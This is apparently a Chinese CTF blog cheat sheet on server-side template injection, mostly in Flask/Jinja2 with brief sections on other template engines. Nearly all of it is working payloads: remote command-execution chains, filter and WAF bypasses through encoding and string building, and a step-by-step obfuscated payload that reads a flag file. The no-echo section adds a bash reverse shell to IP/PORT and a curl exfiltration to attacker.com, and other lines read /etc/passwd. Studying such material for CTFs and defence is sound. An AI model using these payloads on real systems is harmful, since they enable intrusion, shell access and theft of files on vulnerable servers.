---
title: SSTI
author: Creexile
date: 2024-03-10
lastMod: 2025-10-19
summary: ''
cover: ''
category: 'CTF'
draft: false
comments: false
sticky: 0
tags: [SSTI, CTF]
---

参考文章

1. [aliyun-flask之ssti模版注入从零到入门](https://xz.aliyun.com/t/3679)
2. [个人博客-SSTI进阶](https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/)
3. [csdn-超详细SSTI模板注入漏洞原理讲解](https://blog.csdn.net/qq_61955196/article/details/132237648)

# SSTI

python中的flask, php的thinkphp, java的spring等采用MVC的模式的框架, 如果处理用户输入存在问题, 就会导致SSTI

服务端接收攻击者的恶意输入以后, 未经任何处理就将其作为 Web 应用模板内容的一部分, 模板引擎在进行目标编译渲染的过程中, 执行了攻击者插入的语句

## 判断漏洞

未过滤

```
// 看Flask框架基本上会有SSTI, 如果输出49则证明有漏洞
{{7*7}}
```

过滤

```
// 双花括号被过滤, 用{%%}
{%print 123%}

// 数字被过滤, 通过if条件来判断: {%if 条件%}result{%endif%}
{%if not a%}yes{%endif%}
// 数字被过滤, 构造payload先获取数字然后将数字变为乘法运算
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}

// 部分关键词被过滤, 例如:
{%set popen=dict(popen=a)|join%}
// 换成
{%set pp=dict(po=a,pen=b)|join%}
```

> 如果if的条件正确, 就会输出result, 否则输出空
> 观察页面是否输出yes, 如果输出yes, 则代表有漏洞, 其中, 语句中的a默认是false, 前>面加一个not就是true

## 获取数字

先测试是否数字被过滤,如无过滤跳过这一步

```
?name={%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%print (one,two,three,four,five,six,seven,eight,nine)%}
```

![image-20240310155927535](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240310155927535.png)

## 常见漏洞链

仅做了解, 大部分题目为Python和Java, 暂时仅讲解Python, Java单独新开一个

1. Jinja2 (Python)

```python
{{().__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
{{request.__class__.__mro__[1].__subclasses__()[X]('whoami',shell=True,stdout=-1).communicate()}}
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['sys'].modules['os'].popen('ls').read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

2. Twig (PHP)

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag")}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
```

3. Freemarker (Java)

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ ex("java.lang.ProcessBuilder","whoami").start() }
${"freemarker.template.utility.JythonRuntime"?new()>"__import__('os').system('id')"}
```

4. Velocity (Java)

```java
#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
#set($input=$class.inspect("java.lang.Process").type.getInputStream())
#set($sc=$class.inspect("java.util.Scanner"))
#set($constructor=$sc.getConstructor($class.inspect("java.io.InputStream")))
#set($scan=$constructor.newInstance($x.getInputStream()))
$scan.nextLine()
```

5. Thymeleaf (Spring)

```java
${T(java.lang.Runtime).getRuntime().exec('whoami')}
${#ctx.getVariable('T(java.lang.Runtime)').getRuntime().exec('id')}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

6. Smarty (PHP)

```php
{php}echo `id`;{/php}
{system('cat /flag')}
{if phpinfo()}{/if}
```

## 过滤

### 过滤点

可以通过中括号获取属性

```python
''.__class__ = ''['__class__']
```

### 过滤中括号

如果同时过滤了点, 用`|attr`过滤器

```python
''.__class__ = ''|attr('__class__')
```

#### 魔法方法

还可以用魔法方法: `__getattribute__`来获取属性，`__getitem__`来获取字典中的键值

```python
''.__class__ = ''.__getattribute__('__class__')
url_for.__globals__['__builtins__'] == url_for.__globals__.__getitem__('__builtins__')
#__globals__返回的是字典, 另外__builtins__也是
```

#### url_for

`url_for`是Flask中一个特殊的方法, 模板注入中可用于命令执行

```python
{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
#类似的还有
get_flashed_messages.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")

lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")
# 另外还有，lipsum.__globals__含有os模块：
{{lipsum.__globals__['os'].popen('ls').read()}}
# 别人发现的
{{get_flashed_messages.__globals__['os'].popen('dir').read()}}
{{url_for.__globals__['os'].popen('dir').read()}}
```

#### config

`{{config}}`所有设置，也可以用于获得其他东西

```python
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}

{{ config.__class__.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('dir').read()")}}
```

实际上，对于任何`.__init__`不带`wrapper`的都可以调用到`__globals__`，而在flask中，未定义的也不带，所以有如下payload

```python
foobar.__class__.__init__.__globals__['__builtins__']
# 这里面有个opne函数，open("filename").read可以直接读取文件
# foobar.__class__.__init__显示的是：<function Undefined.__init__ at 0x03275658>
```

#### 字典

```python
# 删除某个键值,返回值是改键值，可能删除掉东西
url_for.__globals__.pop('__builtins__')
# 得到某个键值，这个好用
url_for.__globals__.get('__builtins__')
# 和get类似
url_for.__globals__.setdefault('__builtins__')
```

Python可以直接用点操作符拼接

```python
{{url_for.__globals__.__builtins__}}
```

对于中括号最常用的数组取值的功能, 我们可以利用`__getitem__`替代:

```python
''.__class__.__mro__[-1] == ''.__class__.__mro__.__getitem__(-1)
```

### 过滤关键字

#### 拼接

```python
# 或者使用过滤器 ('__clas','s__')|join
''.__class__ = ''['__cla' + 'ss__']
# 去掉也行
''.__class__ = ''['__cla''ss__']
# ~号拼接
''.__class__ = ''['__cla'~'ss__']
{%set a='__cla' %}{%set b='ss__'%}{{""[a~b]}}

{{().__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['o'+'s'].popen('l'+'s').read()}}
```

#### 转置

```python
# 或者使用过滤器 "__ssalc__"|reverse
''.__class__ = ''['__ssalc__'[::-1]]
```

#### 利用str内置方法

```python
# 字符串的替换，还可以使用过滤器 "__claee__"|replace("ee","ss")
''['__CLASS__'.lower()]
''.__class__ == ""['__cTass__'.replace("T","l")] ==
''['X19jbGFzc19f'.decode('base64')]
# 似乎是python3的原因:'str object' has no attribute 'decode'
```

#### 编码绕过

```python
# 字符串格式化
''.__class__ = ''["{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}".format(95,95,99,108,97,115,115,95,95)]
# 或者使用过滤器  ""["%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)]

# 十六进制的字符绕过
''.__class__ = ''["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]

# chr函数转换, 但是需要寻找chr函数
{% set chr=url_for.__globals__['__builtins__'].chr %}
# {%set chr = x.__init__.__globals__['__builtins__'].chr%}
{{""[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}

{{().__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['os'].popen('cat /etc/passwd'.encode('rot13')).read()|rot13}}
```

#### 属性链遍历

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}
```

### request绕过

值得拿出来溜溜

```python
# 新开一个路, 这条路不就没有之前那么多限制了吗
request              # request.__init__.__globals__['__builtins__']
request.args.x1   	 # get传参
request.values.x1 	 # 所有参数
request.cookies      # cookies参数
request.headers      # 请求头参数
request.form.x1   	 # post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 # post传参	(Content-Type:a/b)
request.json		 # post传json  (Content-Type: application/json)
```

给个例子

```python
{{x.__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)}}
# 然后首部设置Cookie:x1=__builtins__;x2=__import__('os').popen('cat /flag').read()

{{""[request["args"]["class"]][request["args"]["mro"]][1][request["args"]["subclass"]]()[286][request["args"]["init"]][request["args"]["globals"]]["os"]["popen"]("ls /")["read"]()}}
# post或者get传参 class=__class__&mro=__mro__&subclass=__subclasses__&init=__init__&globals=__globals__ (适用于过滤下划线)
```

xyctf 2025 题目 Now you see me 1

使用`request.endpoint`获取到当前路由的函数名, 通过切片获取字符, 然后构造`request.data`, 再在请求体中传入任意字符进行绕过, 最终获得任意字符

### 过滤单/双引号

用`request`或者`chr()`方法

```python
# request
{{config.__class__.__init__.__globals__[request.args.os].popen(request.args.command).read()}}&os=os&command=cat /flag

# chr(): __globals__['os']['popen']('ls').read()
{%set chr = x.__init__.__globals__.get(__builtins__).chr%}
{{x.__init__.__globals__[chr(111)%2bchr(115)][chr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)](chr(108)%2bchr(115)).read()}}
```

### 过滤双花括号

据我所知, 应该还有几种括号可以用, 比如`{% ... %}`

```python
{%print(x|attr(request.cookies.init)|attr(request.cookies.globals)|attr(request.cookie.getitem)|attr(request.cookies.builtins)|attr(request.cookies.getitem)(request.cookies.eval)(request.cookies.command))%}
# cookie: init=__init__;globals=__globals__;getitem=__getitem__;builtins=__builtins__;eval=eval;command=__import__("os").popen("cat /flag").read()

{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://ip:8080/?i=ls /').read()=='p' %}1{% endif %}
# python2 没测试过
```

### 过滤小括号

没见过

### 无回显

```python
# 反弹shell
{{().__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"')}}

# DNS外带
{{().__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['os'].popen('curl http://attacker.com/`whoami`')}}
```

## 利用过程

你看payload感觉就像一把梭, 没事, 看看是怎么一步一步做的

## 构造字符

各种奇妙知识

### 过滤器 ()|select|string

`()|select|string`得到的结果是: `<generator object select_or_reject at 0x十六进制数字>`; 你看, 有下划线有字母, 那肯定可以构造啊

```python
{{(()|select|string)[24]~
(()|select|string)[24]~
(()|select|string)[15]~
(()|select|string)[20]~
(()|select|string)[6]~
(()|select|string)[18]~
(()|select|string)[18]~
(()|select|string)[24]~
(()|select|string)[24]}} = "__classs__"
```

如果过滤了中括号，还可以使用`foobar|select|string|list`转换为列表后，使用`pop`或者`__getitem__`来取值

### dict(clas=a,s=b)|join

使用`dict(cla=a,s=b)|join`后，得到的是字符串”class”

```python
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(24)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
#("_","_","init","_","_")|join()  实际上使用可以不用join后面的括号
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
{%print(x.open(file).read())%}
```

### dict(e=a)|join|count

当过滤数字的时候，我们可以用这种方法得到数字

```python
dict(e=a)|join|count #1
dict(ee=a)|join|count #2
```

## 构造字符获取payload步骤

先确定payload

```
(lipsum|attr("__globals__").get("os").popen("cat /flag").read()
```

### 思路

如果数字被过滤, 获取数字

获得`__globals__`
-> 从`lipsum|string|list`中获取下划线
-> 使用`pop()`方法 `pop`方法可以根据索引值来删除列中的某个元素并将该元素返回值返回

获取`os`模块
-> 使用`get`方法

获取`popen`方法
-> 获取`popen`字段

获取flag
-> 获得`chr`函数, 通过`chr`函数来获得命令的每个字符
-> 获取`__builtins__`, 通过`(lipsum|attr("__globals__")).get("__builtins__").get("chr")`
-> 获取`read`, 执行shell命令

### 获取 pop

```python
# 显示 pop 成功
{%set pop=dict(pop=a)|join%}
{%print pop%}
```

### 查看 string 表

```python
# _ 会在第 24 个
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)%}{%print xiahuaxian%}
```

### 利用 pop 获取下划线

```python
# 显示 _ 成功
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}{%print xiahuaxian%}
```

### 获取\_\_globals\_\_

```python
# 显示 __globals__ 成功
{%set pop=dict(pop=a)|join%}{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%print globals%}
```

### 获取 get

```python
# 显示 get 成功
{%set get=dict(get=a)|join%}
{%print get%}
```

### 获取os模块

```python
# 显示 <module 'os' from '/usr/local/lib/python3.8/os.py'> 成功
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set shell=dict(o=a,s=b)|join%}
{%print (lipsum|attr(globals))|attr(get)(shell)%}
```

### 获取popen字段

```python
# 显示 popen 成功
{%set popen=dict(popen=a)|join%}
{%print popen%}
```

### 获取popen方法

```python
# 返回 <function popen at 0x...> 成功
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set shell=dict(o=a,s=b)|join%}
{%set popen=dict(popen=a)|join%}
{%print (lipsum|attr(globals))|attr(get)(shell)|attr(popen)%}
```

### 获取\_\_builtins\_\_

```python
# 返回 __builtins__ 成功
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%print builtins%}
```

### 获取 chr 函数

```python
# 返回 <built-in function chr> 成功
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%}
{%print char%}
```

### 拼接 shell 命令

```python
# 返回 cat /flag 成功(此处执行命令为 cat /flag)
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%}
{%set command=char(99)+char(97)+char(116)+char(32)+char(47)+char(102)+char(108)+char(97)+char(103)%}
{%print command%}
```

### 获取read

```python
# 返回 read 成功
{%set read=dict(read=a)|join%}
{%print read%}
```

### 执行 shell ( payload )

```python
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set shell=dict(o=a,s=b)|join%}
{%set popen=dict(popen=a)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%}
{%set command=char(99)+char(97)+char(116)+char(32)+char(47)+char(102)+char(108)+char(97)+char(103)%}
{%set read=dict(read=a)|join%}{%print (lipsum|attr(globals))|attr(get)(shell)|attr(popen)(command)|attr(read)()%}
```

## 其他方式

[Fenjing一把梭](https://github.com/Marven11/Fenjing)

### lipsum链

`lipsum` 是 Jinja2 模板引擎中的一个全局函数。它是 Flask/Jinja2 中一个常用的内置函数，主要用于生成占位文本（Lorem Ipsum）

正常用法如下:

```jinja2
{# 在正常模板中使用 #}
{{ lipsum() }}  {# 生成随机 Lorem Ipsum 文本 #}
{{ lipsum(3) }} {# 生成3段文本 #}
```

而能在ssti中利用`lipsum`的原因, 它是一个**函数对象**，具有 `__globals__` 属性，可以用于访问 Python 内置模块, 而且Flask应用**默认启用**

```jinja2
{# 基本利用链 #}
{{ lipsum.__globals__ }}
{{ lipsum.__globals__.os }}
{{ lipsum.__globals__.__builtins__ }}

{# 完整命令执行链 #}
{{ lipsum.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ lipsum.__globals__.__builtins__.__import__('os').system('whoami') }}
{# 如果global中已经有os了就直接用 #}
{{ lipsum.__globals__.__getitem__('os').popen('id').read() }}
{{ lipsum.__globals__.get('os').popen('id').read() }}
```

> 因为`__globals__`返回的是字典，所以可以使用get来获取值而不用`__getitem__`

`lipsum`的好处是它可以使用attr过滤器来绕过`.`和`[]`被过滤的情况

```jinja2
{{ lipsum|attr("__globals__")|attr("__builtins__")|attr("__import__")("os")|attr("popen")("id")|attr("read")() }}
```

结合编码可以绕过大多数的waf, 比如这个:

```jinja2
{# {{ lipsum.__globals__.get('os').popen('ls').read() }} #}
{%print(lipsum|attr("%c%c%c%c%c%c%c%c%c%c%c"%(95,95,103,108,111,98,97,108,115,95,95))|attr("%c%c%c"%(103,101,116))("os"))|attr("%c%c%c%c%c"%(112,111,112,101,110))("ls")|attr("%c%c%c%c"%(114,101,97,100))()%}
```

还有其他类似的Flask/Jinja2全局对象, 比如dict对象, range函数, cycler函数, joiner函数, namespace函数, 他们都有`__init__.__globals__.__builtins__`, 都可以试试

```jinja2
{{ dict.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ dict.__base__.__subclasses__()[X].__init__.__globals__['os'].popen('ls').read() }}
```
